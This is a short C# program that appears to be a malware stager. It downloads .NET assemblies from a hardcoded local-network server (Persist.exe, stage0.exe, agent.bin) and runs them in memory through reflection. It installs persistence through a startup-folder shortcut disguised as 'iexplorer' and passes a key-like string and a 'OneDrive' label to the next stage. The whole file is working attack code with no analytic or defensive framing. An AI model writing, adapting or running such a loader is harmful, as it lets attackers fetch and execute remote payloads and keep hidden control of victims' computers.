

using System;
using System.IO;
using System.Net;
using System.Text;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reflection;
using System.Threading;

public class ikiik
{
	public static void Load(string url, string clsn, WebClient myWebClient, bool isstage)
	{
		byte[] myDataBuffer = myWebClient.DownloadData(url);
		Assembly a = Assembly.Load (myDataBuffer);
		Type myType = a.GetType(clsn);
		MethodInfo myMethod = myType.GetMethod("Main");
		object obj = Activator.CreateInstance(myType);
		ParameterInfo[] parameters = myMethod.GetParameters();
		if (!isstage)
		{
			string[] s = new String[0]{};
			object[] parametersArray = new object[] {s};
			myMethod.Invoke(obj,parametersArray);
		}
		else
		{

			string[] s = new String[3]{"http://192.168.1.5:8888/agent.bin", "DtGvFck#", "OneDrive"};
			object[] parametersArray = new object[] {s};
			myMethod.Invoke(obj,parametersArray);
		}

	}
	public static void Main(string[] args)
        {
		WebClient myWebClient = new WebClient();
		string lnkpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\startup\";
		string lnkname = "iexplorer";
		if (File.Exists(lnkpath + lnkname + ".lnk") == false)
            	{
			Load("http://192.168.1.5:8888/Persist.exe", "Persist", myWebClient, false);
		}
		Load("http://192.168.1.5:8888/stage0.exe", "Program", myWebClient, true);
		Console.WriteLine("Done");
		Environment.Exit(0);
	}
}

